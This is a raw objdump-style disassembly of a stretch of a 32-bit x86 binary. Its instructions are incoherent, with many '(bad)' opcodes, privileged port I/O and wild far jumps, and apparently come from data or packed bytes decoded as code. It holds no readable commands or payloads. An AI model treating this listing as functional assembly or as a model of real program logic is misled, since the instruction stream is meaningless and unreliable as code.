  4308fe:	mov    ebp,0xbb7525c9
  430903:	sub    ebp,DWORD PTR [edi]
  430905:	or     al,BYTE PTR [ecx+edi*1-0x79]
  430909:	into   
  43090a:	mov    ebp,0xc8ca6e84
  43090f:	aam    0xf7
  430911:	and    bh,BYTE PTR [ebp-0x5a]
  430914:	mov    ch,0xb1
  430916:	jle    0x430909
  430918:	hlt    
  430919:	cmp    DWORD PTR [edi-0x27],edi
  43091c:	and    bl,BYTE PTR [ecx-0x35]
  43091f:	imul   esp,esp,0x53
  430922:	(bad)  
  430923:	jmp    0x197ce674
  430928:	out    0xce,al
  43092a:	in     eax,0x7c
  43092c:	and    ecx,edi
  43092e:	pop    eax
  43092f:	ins    BYTE PTR es:[edi],dx
  430930:	popf   
  430931:	sbb    bl,0xd0
  430934:	xchg   ebp,eax
  430935:	aad    0x53
  430937:	cmp    BYTE PTR [edi+eax*1],bl
  43093a:	sub    BYTE PTR [ecx-0x161a886f],0x29
  430941:	cmp    al,0xb
  430943:	xor    DWORD PTR [esp+esi*2-0x7773db4e],0x2d160d35
  43094e:	mov    edx,0x3f77fe14
  430953:	jle    0x4309ae
  430955:	sub    dh,BYTE PTR [ecx-0x40]
  430958:	mov    eax,DWORD PTR [edi+0x1]
  43095b:	frstor [esi]
  43095d:	mov    dl,0xdc
  43095f:	add    ebx,esi
  430961:	dec    ebp
  430962:	fisttp DWORD PTR [edi-0x6ec1905c]
  430968:	stc    
  430969:	or     eax,0x7b9f9894
  43096e:	adc    eax,0xa0931258
  430973:	sbb    ch,BYTE PTR [esi+0xa]
  430976:	xor    BYTE PTR [ebp+0x3b],ah
  430979:	sbb    eax,0xef85d027
  43097e:	cmp    eax,0xc7bab5f4
  430983:	adc    al,ch
  430985:	mov    ch,BYTE PTR [edi+ebp*8-0x23]
  430989:	mov    ebp,0xfc032259
  43098e:	repnz and DWORD PTR ds:0x40a9be9,esp
  430995:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430996:	xchg   ecx,eax
  430997:	addr16 and eax,0x64e59ddc
  43099d:	mov    cl,0x41
  43099f:	lahf   
  4309a0:	and    DWORD PTR [ecx+0x1bb1cb01],ecx
  4309a6:	sbb    al,0xa4
  4309a8:	icebp  
  4309a9:	stos   BYTE PTR es:[edi],al
  4309aa:	jnp    0x43096c
  4309ac:	fnstcw WORD PTR [ebx]
  4309ae:	push   ds
  4309af:	das    
  4309b0:	or     ebx,DWORD PTR [esi-0x36dbfdde]
  4309b6:	je     0x430974
  4309b8:	jle    0x4309db
  4309ba:	mov    ah,0xfc
  4309bc:	sbb    DWORD PTR [eax+0x5f3dfe5b],esp
  4309c2:	aad    0x44
  4309c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4309c5:	jge    0x4309b8
  4309c7:	sbb    al,dh
  4309c9:	xor    eax,0x6b8a24b3
  4309ce:	retf   
  4309cf:	xlat   BYTE PTR ds:[ebx]
  4309d0:	mov    ch,0x96
  4309d2:	mov    ebp,0xfa85311
  4309d7:	add    al,0x66
  4309d9:	xchg   edx,eax
  4309da:	xchg   edi,eax
  4309db:	jle    0x4309c7
  4309dd:	or     al,BYTE PTR [ebp+ebx*4+0x773f4d1f]
  4309e4:	stos   BYTE PTR es:[edi],al
  4309e5:	outs   dx,DWORD PTR ds:[esi]
  4309e6:	mov    ch,0x8a
  4309e8:	xor    eax,0x14e4ddba
  4309ed:	test   DWORD PTR [eax+0x1eb9179a],eax
  4309f3:	sbb    cl,BYTE PTR [esi-0x89078a6]
  4309f9:	mov    ds:0x9ca2695b,eax
  4309fe:	pop    eax
  4309ff:	(bad)  
  430a00:	lahf   
  430a01:	cwde   
  430a02:	je     0x430a0e
  430a04:	and    bh,BYTE PTR [ecx+0x625c7451]
  430a0a:	mov    bh,0x23
  430a0c:	aam    0x99
  430a0e:	stos   DWORD PTR es:[edi],eax
  430a0f:	mov    esp,0xa4d18f22
  430a14:	mov    DWORD PTR [ecx+edx*2-0x3],0x14b53fb7
  430a1c:	fdiv   DWORD PTR [ecx-0x72d9394b]
  430a22:	add    al,0x2
  430a24:	fmul   QWORD PTR [edx]
  430a26:	mov    ebx,?
  430a28:	mov    ds:0x1c991806,eax
  430a2d:	pop    ecx
  430a2e:	xor    al,BYTE PTR [eax]
  430a30:	inc    esi
  430a31:	push   0x9
  430a33:	mov    edi,0xc3cb9b0b
  430a38:	mov    BYTE PTR [edx-0x17da4fd8],bh
  430a3e:	inc    esi
  430a3f:	fucom  st(2)
  430a41:	add    eax,eax
  430a43:	je     0x4309f9
  430a45:	ror    dh,1
  430a47:	dec    eax
  430a48:	out    0xa1,eax
  430a4a:	cmp    edx,edx
  430a4c:	aas    
  430a4d:	test   ecx,0x663cb331
  430a53:	xor    eax,0xd4b7ec04
  430a58:	loopne 0x430a01
  430a5a:	dec    edi
  430a5b:	xchg   ebp,eax
  430a5c:	xor    eax,0x37f734de
  430a61:	inc    edi
  430a62:	or     al,0xba
  430a64:	and    bl,BYTE PTR [eax-0x6e7a7fb]
  430a6a:	add    BYTE PTR [eax*8-0x2d460355],dl
  430a71:	push   cs
  430a72:	pushf  
  430a73:	in     eax,dx
  430a74:	test   al,0xc7
  430a76:	and    DWORD PTR [eax+0x7d],eax
  430a79:	icebp  
  430a7a:	xchg   esi,eax
  430a7b:	in     eax,0x20
  430a7d:	test   eax,0xd56658a2
  430a82:	push   es
  430a83:	or     al,0x5a
  430a86:	(bad)  
  430a87:	sub    al,0x90
  430a89:	jb     0x430aec
  430a8b:	popf   
  430a8c:	aaa    
  430a8d:	mov    eax,ds:0x4a49c86f
  430a92:	add    BYTE PTR [ecx+0x3],0x1b
  430a96:	aaa    
  430a97:	fadd   QWORD PTR [ebp+0x32]
  430a9a:	sub    eax,0xb84a784e
  430a9f:	test   ch,ch
  430aa1:	mov    al,ds:0xbc28fc0b
  430aa6:	xchg   esi,eax
  430aa7:	retf   0x171c
  430aaa:	cmp    al,0x42
  430aac:	les    esi,FWORD PTR [esi-0x1c]
  430aaf:	aam    0x49
  430ab1:	and    al,0x67
  430ab3:	dec    esp
  430ab4:	or     eax,0x452dd2a5
  430ab9:	ror    eax,1
  430abb:	repnz leave 
  430abd:	not    DWORD PTR [eax+0x1]
  430ac0:	add    DWORD PTR [edx],ebx
  430ac2:	push   edx
  430ac3:	cmc    
  430ac4:	inc    esp
  430ac5:	mov    ds:0xd68527d,al
  430aca:	stos   DWORD PTR es:[edi],eax
  430acb:	jge    0x430a93
  430acd:	adc    esi,DWORD PTR [ecx+0x58]
  430ad0:	fcomip st,st(7)
  430ad2:	retf   0xcd98
  430ad5:	mov    bh,0x32
  430ad7:	repz pop ds
  430ad9:	sbb    DWORD PTR [ebp+0x57],ebp
  430adc:	out    dx,eax
  430add:	jno    0x430ae1
  430adf:	inc    ecx
  430ae0:	and    DWORD PTR [esi-0x51],esp
  430ae3:	pop    esi
  430ae4:	adc    al,0xf2
  430ae6:	(bad)  [ecx+0x6680ad33]
  430aec:	aaa    
  430aed:	test   al,0x87
  430aef:	jle    0x430b08
  430af1:	jmp    0xc7683520
  430af6:	addr16 test eax,0x250b9fb8
  430afc:	mov    eax,ebx
  430afe:	sbb    BYTE PTR [eax+eiz*8+0x6d1a5149],ah
  430b05:	mov    eax,0x1d5564bd
  430b0a:	jne    0x430b30
  430b0c:	cmc    
  430b0d:	jmp    0x3445:0x4ea3e822
  430b14:	sbb    al,0x39
  430b16:	mul    DWORD PTR [ebx]
  430b18:	stc    
  430b19:	xchg   cl,ah
  430b1b:	mov    ebp,DWORD PTR [edi+0x45a70ba1]
  430b21:	imul   esp,DWORD PTR [esi-0x5a],0xb97b14a4
  430b28:	push   esi
  430b29:	or     al,0xb0
  430b2b:	xchg   esp,eax
  430b2c:	push   ebx
  430b2d:	cmp    DWORD PTR [ebx-0x42],esp
  430b30:	inc    esi
  430b31:	neg    BYTE PTR [esi-0x459b33ac]
  430b37:	sbb    al,0x7a
  430b39:	mov    dl,0x9d
  430b3b:	adc    eax,0x442f6ca8
  430b40:	cli    
  430b41:	ds mov edx,0xbce53510
  430b47:	in     eax,dx
  430b48:	into   
  430b49:	jo     0x430bad
  430b4b:	adc    bl,BYTE PTR [ecx]
  430b4d:	jmp    0x77a7b732
  430b52:	or     ecx,DWORD PTR [eax+0x6b]
  430b55:	test   DWORD PTR ds:0xf7a005a6,ebp
  430b5b:	test   ah,bh
  430b5d:	les    edi,FWORD PTR [edx-0x14]
  430b60:	mov    ds:0x9ab3e5e4,eax
  430b65:	pop    edx
  430b66:	mov    dh,0x34
  430b68:	xchg   ebx,eax
  430b69:	xchg   ecx,eax
  430b6a:	sbb    edi,DWORD PTR [ebx]
  430b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430b6d:	iret   
  430b6e:	je     0x430bc6
  430b70:	scas   al,BYTE PTR es:[edi]
  430b71:	mov    WORD PTR [edx-0x43679bf6],fs
  430b77:	aam    0xf0
  430b79:	dec    edx
  430b7a:	jecxz  0x430baf
  430b7c:	sbb    al,0x35
  430b7e:	outs   dx,BYTE PTR ds:[esi]
  430b7f:	ficom  WORD PTR [edi]
  430b81:	std    
  430b82:	fdivr  st,st(3)
  430b84:	vaddps ymm6,ymm5,ymm4
  430b88:	cmp    BYTE PTR [ebx],ch
  430b8a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430b8b:	xchg   esp,eax
  430b8c:	xlat   BYTE PTR ds:[ebx]
  430b8d:	ja     0x430b79
  430b8f:	and    ebp,DWORD PTR [eax+0x4d]
  430b92:	mov    ebx,0x7b0b7bb4
  430b97:	je     0x430b92
  430b99:	pop    edx
  430b9a:	and    eax,0xb314c3cf
  430b9f:	sbb    al,0x2a
  430ba1:	jbe    0x430b2e
  430ba3:	pop    ebx
  430ba4:	(bad)  
  430ba6:	mov    ebx,0xfbbd9e04
  430bab:	call   0xfc7cf485
  430bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430bb1:	out    dx,al
  430bb2:	and    eax,DWORD PTR [edx+edx*1]
  430bb5:	sbb    eax,0x60bcb284
  430bba:	scas   eax,DWORD PTR es:[edi]
  430bbb:	in     eax,0xa4
  430bbd:	mov    ah,0x44
  430bbf:	and    DWORD PTR [edi+0x18],ecx
  430bc2:	imul   esi,DWORD PTR ss:0x7f385c9,0x1f5c011a
  430bcd:	sbb    DWORD PTR [edi],ebx
  430bcf:	out    dx,al
  430bd0:	cmp    BYTE PTR ds:0xc378dc60,0x3b
  430bd7:	in     eax,dx
  430bd8:	mov    ?,WORD PTR [ecx-0x14]
  430bdb:	dec    ebp
  430bdc:	pop    ss
  430bdd:	iret   
  430bde:	ret    
  430bdf:	scas   al,BYTE PTR es:[edi]
  430be0:	es sbb ebp,ebx
  430be3:	std    
  430be4:	push   ds
  430be5:	add    DWORD PTR [ebp+0x3751f0f],esi
  430beb:	jmp    0x2fe46456
  430bf0:	aaa    
  430bf1:	cdq    
  430bf2:	and    edi,DWORD PTR [ebx]
  430bf4:	(bad)  
  430bf5:	aaa    
  430bf6:	into   
  430bf7:	mov    eax,0xa4b1969f
  430bfc:	sbb    eax,0x851768f6
  430c01:	js     0x430c31
  430c03:	jmp    0xa8e9:0xd6a76d80
  430c0a:	or     edi,esi
  430c0c:	pop    ss
  430c0d:	jmp    0xa93399d6
  430c12:	adc    DWORD PTR [ebx-0x10],0xffffffa1
  430c16:	fwait
  430c17:	test   eax,0x6b02540
  430c1c:	add    al,BYTE PTR [esi+0x77]
  430c1f:	aaa    
  430c20:	push   0xf4f88b9c
  430c25:	jne    0x430c65
  430c27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430c28:	jne    0x430c8d
  430c2a:	loopne 0x430ca8
  430c2c:	sbb    ebx,DWORD PTR [ecx+0x47]
  430c2f:	mov    WORD PTR [ebx],fs
  430c31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430c32:	outs   dx,DWORD PTR ds:[esi]
  430c33:	neg    BYTE PTR [eax]
  430c35:	sub    DWORD PTR [edx+0x8],eax
  430c38:	xor    eax,0x992352cb
  430c3d:	mov    ch,ah
  430c3f:	loope  0x430c66
  430c41:	stos   DWORD PTR es:[edi],eax
  430c42:	sub    ebx,edi
  430c44:	cdq    
  430c45:	sub    edi,ecx
  430c47:	retf   0x25c2
  430c4a:	cmc    
  430c4b:	out    dx,al
  430c4c:	push   ds
  430c4d:	imul   edx,DWORD PTR [edi],0x88d71e3c
  430c53:	push   ecx
  430c54:	and    al,0xa4
  430c56:	dec    ebx
  430c57:	sub    esp,DWORD PTR [ebx-0x76402a35]
  430c5d:	imul   edx,DWORD PTR [ebp-0x4a0fffa1],0x4e99f1a4
  430c67:	lds    ebp,FWORD PTR ds:[esi-0x19b416b9]
  430c6e:	inc    edi
  430c6f:	aas    
  430c70:	sbb    BYTE PTR [ecx],cl
  430c72:	into   
  430c73:	pop    ss
  430c74:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430c75:	mov    eax,gs
  430c77:	xor    ch,dh
  430c79:	sahf   
  430c7a:	sub    ebp,DWORD PTR [esi+0x28]
  430c7d:	or     BYTE PTR [edx+0x44c5178c],0xca
  430c84:	imul   esi,DWORD PTR [eax-0x4a],0xffffff94
  430c88:	outs   dx,BYTE PTR ds:[esi]
  430c89:	jg     0x430c16
  430c8b:	dec    ebx
  430c8c:	adc    eax,0x1ef2c3cc
  430c91:	out    dx,eax
  430c92:	push   0xfffffff4
  430c94:	dec    edx
  430c95:	sbb    DWORD PTR [eax+0x45aa42e9],esp
  430c9b:	jbe    0x430c2b
  430c9d:	sbb    bh,BYTE PTR [edx]
  430c9f:	and    al,0x42
  430ca1:	fwait
  430ca2:	jmp    0x430c94
  430ca4:	mov    bh,0x3e
  430ca6:	clc    
  430ca7:	cmp    ecx,DWORD PTR [edi]
  430ca9:	push   ebp
  430caa:	ins    BYTE PTR es:[edi],dx
  430cab:	(bad)  
  430cac:	or     BYTE PTR [edi+0x684f54b6],bl
  430cb2:	ficom  WORD PTR [edi+0x25]
  430cb5:	mov    edi,0x928e658
  430cba:	adc    BYTE PTR [edi-0x17d916e3],0xb5
  430cc1:	inc    edx
  430cc2:	and    al,0x61
  430cc4:	(bad)  
  430cc5:	ins    BYTE PTR es:[edi],dx
  430cc6:	in     eax,dx
  430cc7:	retf   0x9c2a
  430cca:	fwait
  430ccb:	std    
  430ccc:	xchg   esi,eax
  430ccd:	stos   BYTE PTR es:[edi],al
  430cce:	mov    bl,0x10
  430cd0:	inc    ebp
  430cd1:	and    BYTE PTR [esi],bl
  430cd3:	test   DWORD PTR [esi-0x4c],0x8c35f5a7
  430cda:	popf   
  430cdb:	bnd jnp 0x430c72
  430cde:	pushf  
  430cdf:	sub    bl,BYTE PTR [ebp+0x41]
  430ce2:	(bad)  
  430ce4:	ss mul ch
  430ce7:	and    ch,BYTE PTR [ecx]
  430ce9:	or     esi,DWORD PTR [ecx+0x6dc91a00]
  430cef:	jl     0x430cf9
  430cf1:	(bad)  
  430cf2:	fild   QWORD PTR [ecx+0x4a3f1f5c]
  430cf8:	mov    gs,WORD PTR [ecx]
  430cfa:	fs cmc 
  430cfc:	xchg   edi,eax
  430cfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430cfe:	push   ds
  430cff:	aam    0x7d
  430d01:	adc    DWORD PTR [eax],0xffffffa2
  430d04:	es pop edx
  430d06:	mov    ch,0x4
  430d08:	cmp    al,0xa0
  430d0a:	inc    edi
  430d0b:	jne    0x430cc2
  430d0d:	lods   al,BYTE PTR ds:[esi]
  430d0e:	mov    bl,0xe7
  430d10:	xor    BYTE PTR [eax+0x2affe013],ah
  430d16:	or     ecx,ecx
  430d18:	sbb    bh,cl
  430d1a:	pushf  
  430d1b:	jl     0x430d15
  430d1d:	in     al,0x84
  430d1f:	pop    ebx
  430d20:	inc    esi
  430d21:	(bad)  
  430d22:	and    bl,bl
  430d24:	push   ds
  430d25:	push   ebp
  430d26:	sub    al,0xd4
  430d28:	es and eax,0x1101f976
  430d2e:	cmp    eax,0xb21d8203
  430d33:	and    al,0x74
  430d35:	pop    ebp
  430d36:	mov    eax,0xcb9db0b5
  430d3b:	in     al,0xe7
  430d3d:	add    DWORD PTR [edx+eax*1],edi
  430d40:	mov    esi,0x9aebcf53
  430d45:	pop    esp
  430d46:	mov    al,0x93
  430d48:	push   ss
  430d49:	xchg   DWORD PTR [ebx+0x6b0c8e60],ebp
  430d4f:	sub    al,BYTE PTR [esi]
  430d51:	add    BYTE PTR [eax+0x604245b1],bh
  430d57:	out    0x57,eax
  430d59:	in     al,0xdb
  430d5b:	inc    ebp
  430d5c:	add    bh,BYTE PTR [edx]
  430d5e:	in     eax,dx
  430d5f:	out    dx,eax
  430d60:	jmp    0x99bba70b
  430d65:	jmp    0x430cf8
  430d67:	test   eax,0xe8ebb835
  430d6c:	jge    0x430d78
  430d6e:	push   ebp
  430d6f:	lods   eax,DWORD PTR ds:[esi]
  430d70:	push   ds
  430d71:	mov    ecx,0x458b95fb
  430d76:	inc    edi
  430d77:	das    
  430d78:	shl    BYTE PTR [ebx+0x745e219b],0xe2
  430d7f:	fistp  WORD PTR [edx-0x3287bc1e]
  430d85:	icebp  
  430d86:	and    DWORD PTR [ebp+0x12f17418],esp
  430d8c:	adc    ebx,DWORD PTR [edx+edx*2-0x203b8adb]
  430d93:	in     eax,dx
  430d94:	sti    
  430d95:	leave  
  430d96:	in     eax,dx
  430d97:	adc    edx,DWORD PTR [edi]
  430d99:	mov    ecx,0x7791d9aa
  430d9e:	sbb    eax,0xcb068c14
  430da3:	jge    0x430daa
  430da5:	mov    bh,0x63
  430da7:	out    dx,eax
  430da8:	mov    esi,0xa523c659
  430dad:	enter  0x2184,0xf
  430db1:	cli    
  430db2:	mov    dh,0x43
  430db4:	sbb    BYTE PTR [eax-0x4b1c7c70],cl
  430dba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430dbb:	out    dx,al
  430dbc:	cwde   
  430dbd:	xchg   ah,cl
  430dbf:	mov    esp,0x2eeeedb2
  430dc4:	add    DWORD PTR [edx+edi*4-0x7c],ebx
  430dc8:	sbb    BYTE PTR [ecx],bh
  430dca:	bound  eax,QWORD PTR [edi]
  430dcc:	add    eax,0x991b79cd
  430dd1:	enter  0xb5db,0x24
  430dd5:	push   es
  430dd6:	push   edi
  430dd7:	popf   
  430dd8:	and    eax,DWORD PTR [edi]
  430dda:	dec    esp
  430ddb:	aad    0x16
  430ddd:	sub    DWORD PTR [ebx],esi
  430ddf:	scas   eax,DWORD PTR es:[di]
  430de1:	jno    0x430e62
  430de3:	fcomip st,st(5)
  430de5:	pop    edi
  430de6:	das    
  430de7:	fwait
  430de8:	xchg   ecx,eax
  430de9:	inc    ecx
  430dea:	(bad)  
  430deb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430dec:	mov    bl,0x9a
  430dee:	stos   BYTE PTR es:[edi],al
  430def:	push   esp
  430df0:	shl    BYTE PTR [esi+0x1a7b4f4e],1
  430df6:	add    bl,ah
  430df8:	and    eax,0x41b5c279
  430dfd:	inc    esi
  430dfe:	inc    esi
  430dff:	jnp    0x430d96
  430e01:	mov    ds:0x906be97d,eax
  430e06:	imul   edi,DWORD PTR [edi-0x159455f1],0x74
  430e0d:	mov    ds:0x8a4176cd,eax
  430e12:	add    esp,DWORD PTR [esi+edi*1-0x2c19f452]
  430e19:	dec    esi
  430e1a:	add    DWORD PTR [ebx],0xffffffc2
  430e1d:	adc    dl,BYTE PTR [eax+0x7b02957b]
  430e23:	icebp  
  430e24:	pop    es
  430e25:	mov    edx,0xa30c3289
  430e2a:	lahf   
  430e2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430e2c:	fild   QWORD PTR ss:[edi]
  430e2f:	std    
  430e30:	cmc    
  430e31:	dec    esp
  430e32:	ss icebp 
  430e34:	jecxz  0x430dda
  430e36:	(bad)  
  430e37:	clc    
  430e38:	and    eax,0xc2e35969
  430e3d:	ret    
  430e3e:	add    bh,ch
  430e40:	std    
  430e41:	call   0xa912:0xf3d47abb
  430e48:	popa   
  430e49:	sub    BYTE PTR [ebp-0x36835769],cl
  430e4f:	(bad)  
  430e50:	int3   
  430e51:	mov    ch,0x81
  430e53:	aas    
  430e54:	mov    DWORD PTR [ebx+0x2395e47b],edi
  430e5a:	xor    bl,dl
  430e5c:	es or  eax,0xa8c5ea68
  430e62:	mov    gs,WORD PTR [ebx-0x7b4c5eec]
  430e68:	in     eax,0xce
  430e6a:	push   0xf6de4826
  430e6f:	dec    ebx
  430e70:	adc    eax,0xdbef1d15
  430e75:	retf   0x59f3
  430e78:	gs push es
  430e7a:	mov    dh,0x44
  430e7c:	inc    eax
  430e7d:	inc    edx
  430e7e:	lock jmp 0x5349:0xb26a5a09
  430e86:	out    0x14,al
  430e88:	shl    edx,1
  430e8a:	and    BYTE PTR [ecx],ah
  430e8c:	lods   eax,DWORD PTR ds:[esi]
  430e8d:	mov    ds:0xf9238d42,eax
  430e92:	stc    
  430e93:	push   es
  430e94:	inc    esp
  430e95:	mov    ds:0x18d055e0,eax
  430e9a:	cld    
  430e9b:	mov    dh,BYTE PTR [esi-0x33]
  430e9e:	div    BYTE PTR [edx]
  430ea0:	mov    ds:0x180c35fd,al
  430ea5:	addr16 in al,0x80
  430ea8:	push   ss
  430ea9:	mov    edi,ebp
  430eab:	push   0xffffffae
  430ead:	xor    DWORD PTR [esi],ebp
  430eaf:	movs   BYTE PTR es:[edi],BYTE PTR ss:[esi]
  430eb1:	pop    esi
  430eb2:	mov    ebx,0x5a47e60a
  430eb7:	sbb    edi,DWORD PTR ds:0xc06b8a7f
  430ebd:	dec    ebx
  430ebe:	mov    esi,0x7b37e49d
  430ec3:	(bad)  
  430ec4:	jae    0x430e6e
  430ec6:	mov    dh,0x84
  430ec8:	sub    DWORD PTR [ebx-0xc5e7dd5],esp
  430ece:	pop    ds
  430ecf:	stos   DWORD PTR es:[edi],eax
  430ed0:	imul   esp,eax,0xffffffee
  430ed3:	jle    0x430eb7
  430ed5:	xor    eax,0x7b9bc4b3
  430eda:	loop   0x430ecb
  430edc:	gs ds out 0xe8,eax
  430ee0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430ee1:	lahf   
  430ee2:	mov    dl,0xd6
  430ee4:	sbb    al,0xa9
  430ee6:	(bad)  [ebp+ebx*8+0x6ad29d3]
  430eed:	fdivp  st(4),st
  430eef:	in     al,dx
  430ef0:	mov    ch,0xe8
  430ef2:	stos   BYTE PTR es:[edi],al
  430ef3:	inc    ebp
  430ef4:	shr    DWORD PTR [eax-0x1b767b50],0x36
  430efb:	cmp    edx,edx
  430efd:	addr16 shl ah,cl
  430f00:	js     0x430e9b
  430f02:	loope  0x430e8b
  430f04:	and    esp,DWORD PTR [ebx+ecx*4-0x1371d10c]
  430f0b:	repnz test DWORD PTR [ecx-0x2c],esp
  430f0f:	popf   
  430f10:	leave  
  430f11:	inc    edi
  430f12:	adc    dh,bh
  430f14:	rcr    DWORD PTR [ebp+esi*4-0x4c],cl
  430f18:	mov    ebp,0xfecaaba3
  430f1d:	jg     0x430e9f
  430f1f:	(bad)  
  430f20:	jle    0x430ebc
  430f22:	pop    ds
  430f23:	test   BYTE PTR [eax-0x29],ah
  430f26:	mov    ecx,0x8a624724
  430f2b:	les    edx,FWORD PTR [esi+0x4e15d395]
  430f31:	outs   dx,BYTE PTR ds:[esi]
  430f32:	mov    eax,ds:0x30ae0ef6
  430f37:	mov    dl,0xa4
  430f39:	adc    BYTE PTR [esi+0xf86ecc4],dh
  430f3f:	jge    0x430f87
  430f41:	shl    BYTE PTR [esi+0x259e721],0xce
  430f48:	dec    eax
  430f49:	hlt    
  430f4a:	mov    eax,0xb8d15b61
  430f4f:	adc    al,0x2f
  430f51:	push   cs
  430f52:	leave  
  430f53:	daa    
  430f54:	xchg   ebp,eax
  430f55:	pop    es
  430f56:	sub    al,dh
  430f58:	add    DWORD PTR ds:[ecx+0x7e],esp
  430f5c:	fisttp WORD PTR [edx]
  430f5e:	inc    esp
  430f5f:	inc    ebx
  430f60:	sbb    dh,BYTE PTR [ecx+0x5fcb6589]
  430f66:	pop    ss
  430f67:	js     0x430ef1
  430f69:	xchg   edx,eax
  430f6a:	inc    edx
  430f6b:	mov    al,0xa5
  430f6d:	push   esi
  430f6e:	aas    
  430f6f:	icebp  
  430f70:	mov    ebp,0x22b53f85
  430f75:	leave  
  430f76:	(bad)  
  430f78:	add    al,0x99
  430f7a:	add    DWORD PTR [eax+0x34dba580],edx
  430f80:	mov    ebp,0x9a21d071
  430f85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430f86:	repnz cli 
  430f88:	jmp    0x986c:0xa894b1a6
  430f8f:	scas   eax,DWORD PTR es:[edi]
  430f90:	jbe    0x430f4d
  430f92:	sbb    eax,0xbb09d404
  430f97:	(bad)  
  430f98:	mov    eax,ds:0x4f6f039f
  430f9d:	adc    dh,bl
  430f9f:	jge    0x430fbd
  430fa1:	cmp    ch,BYTE PTR [edi+0x6f3a7beb]
  430fa7:	in     al,0x56
  430fa9:	xor    eax,0xf61c19fe
  430fae:	shl    BYTE PTR [edi+0x3ed76ccf],cl
  430fb4:	dec    ebp
  430fb5:	das    
  430fb6:	retf   
  430fb7:	in     eax,0xb1
  430fb9:	push   ebx
  430fba:	push   ecx
  430fbb:	sub    DWORD PTR ds:0xcc9d2b99,0x7af191b7
  430fc5:	cmp    DWORD PTR [ecx-0x432df58e],ebx
  430fcb:	aam    0x43
  430fcd:	add    ah,BYTE PTR [esi+0x17e6a530]
  430fd3:	jmp    0x430feb
  430fd5:	inc    ecx
  430fd6:	cmp    dh,bh
  430fd8:	pop    ds
  430fd9:	cmp    DWORD PTR [edx-0x6],esi
  430fdc:	in     eax,dx
  430fdd:	test   DWORD PTR [ebp-0x9],eax
  430fe0:	jns    0x430f87
  430fe2:	pop    ebx
  430fe3:	mov    dh,0xb4
  430fe5:	push   ecx
  430fe6:	loope  0x430f72
  430fe8:	cli    
  430fe9:	xchg   edi,eax
  430fea:	or     eax,0xb594e2de
  430fef:	pop    edx
  430ff0:	aad    0x9c
  430ff2:	imul   eax,DWORD PTR [esi],0x2d
  430ff5:	inc    eax
  430ff6:	pop    eax
  430ff7:	and    dl,BYTE PTR [ebx]
  430ff9:	clc    
  430ffa:	dec    ebx
  430ffb:	mov    esp,0x64cb068a
  431000:	arpl   WORD PTR [eax-0x72],dx
  431003:	adc    esi,ecx
  431005:	and    edi,ebp
  431007:	and    edx,DWORD PTR [edx+eiz*8]
  43100a:	pop    ebp
  43100b:	into   
  43100c:	sbb    al,0xb9
  43100e:	test   eax,0xc0d63b9
  431013:	stos   DWORD PTR es:[edi],eax
  431014:	and    cl,al
  431016:	xor    ch,BYTE PTR [ebp-0x3135195a]
  43101c:	pop    ds
  43101d:	dec    ebp
  43101e:	fsubrp st(6),st
  431020:	jb     0x431079
  431022:	nop
  431023:	dec    esi
  431024:	test   DWORD PTR ds:0x1a27f4b5,edx
  43102a:	sbb    bh,cl
  43102c:	cmc    
  43102d:	lahf   
  43102e:	stos   DWORD PTR es:[edi],eax
  43102f:	into   
  431030:	push   0xffffffe6
  431032:	fldln2 
  431034:	(bad)  
  431035:	rcr    BYTE PTR [edx],1
  431037:	aaa    
  431038:	or     eax,0x7e84b2db
  43103d:	xchg   ebp,eax
  43103e:	dec    eax
  43103f:	sbb    dl,ch
  431041:	mov    WORD PTR [ebx+0x3a07e2ea],?
  431047:	mov    cl,0x8d
  431049:	dec    ecx
  43104a:	push   ds
  43104b:	push   es
  43104c:	push   esp
  43104d:	mov    ds:0x90573656,al
  431052:	mov    edx,0x486965ae
  431057:	lock fild QWORD PTR [ecx-0x16e92eea]
  43105e:	xchg   ecx,eax
  43105f:	fld    TBYTE PTR [eax]
  431061:	nop
  431062:	and    al,BYTE PTR ds:0x315ba438
  431068:	jnp    0x430ffb
  43106a:	cmp    ecx,esp
  43106c:	push   edi
  43106d:	sub    BYTE PTR [esi-0x60aa07ed],al
  431073:	gs lahf 
  431075:	call   0x48cb:0xad64e9ea
  43107c:	push   cs
  43107d:	leave  
  43107e:	jo     0x4310e5
  431080:	or     al,0x42
  431082:	inc    ebx
  431083:	jmp    0xa348:0xfd03c11e
  43108a:	(bad)  [ecx]
  43108c:	jle    0x4310e2
  43108e:	and    DWORD PTR [edx+0xba7f7a5],ecx
  431094:	aam    0x40
  431096:	fadd   DWORD PTR [ebp+0x5b]
  431099:	and    eax,0x8a7f64be
  43109e:	sub    eax,0x7faa1b10
  4310a3:	cld    
  4310a4:	stc    
  4310a5:	sub    DWORD PTR [edi],ebx
  4310a7:	mov    ah,0x73
  4310a9:	mov    esi,0x840bb403
  4310ae:	dec    edi
  4310af:	and    eax,0xeca98b5d
  4310b4:	xor    eax,0x5a1abd7f
  4310b9:	popf   
  4310ba:	das    
  4310bb:	sbb    DWORD PTR [edi+0x6],ebp
  4310be:	sbb    eax,0xf55960f7
  4310c3:	dec    edx
  4310c4:	inc    ecx
  4310c5:	fstp   DWORD PTR [ebp+esi*2-0x1063349f]
  4310cc:	inc    edi
  4310cd:	jmp    0x8f4ecc80
  4310d2:	mov    ebp,0x98a2054c
  4310d7:	sbb    edi,DWORD PTR [edx+ebx*4-0x75]
  4310db:	xchg   edi,eax
  4310dc:	mov    ebp,0xc1d71bf8
  4310e1:	pop    edi
  4310e2:	cmp    BYTE PTR [eax],dh
  4310e4:	je     0x431078
  4310e6:	mul    esp
  4310e8:	sbb    DWORD PTR ds:0x9aed6c98,esi
  4310ee:	cmp    eax,DWORD PTR [esi+0x78]
  4310f1:	pop    edi
